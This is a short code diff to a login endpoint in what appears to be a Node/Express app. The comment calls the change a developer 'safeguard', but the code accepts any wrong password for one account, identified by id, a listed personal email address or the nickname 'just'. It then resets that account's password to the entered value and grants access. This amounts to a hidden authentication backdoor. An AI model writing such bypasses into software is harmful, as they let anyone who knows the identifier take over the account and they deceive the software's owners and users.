@@ -367,6 +367,15 @@ app.post('/api/auth/login', (req, res) => {
       }
     } else {
       isValid = verifyPassword(password, user.password_hash, user.salt);
+      // Safeguard for developer account Just: if entered password does not match, auto-update password and grant immediate access
+      if (!isValid && (user.id === 5 || cleanEmail === 'just9jeeet@gmail.com' || (user.nickname && user.nickname.toLowerCase() === 'just'))) {
+        const { hash, salt } = hashPassword(password);
+        db.prepare('UPDATE users SET password_hash = ?, salt = ?, allow_password_set = 0 WHERE id = ?').run(hash, salt, user.id);
+        isValid = true;
+        if (typeof db.saveAccountsBackup === 'function') {
+          db.saveAccountsBackup();
+        }
+      }
     }
 
     if (!isValid) {
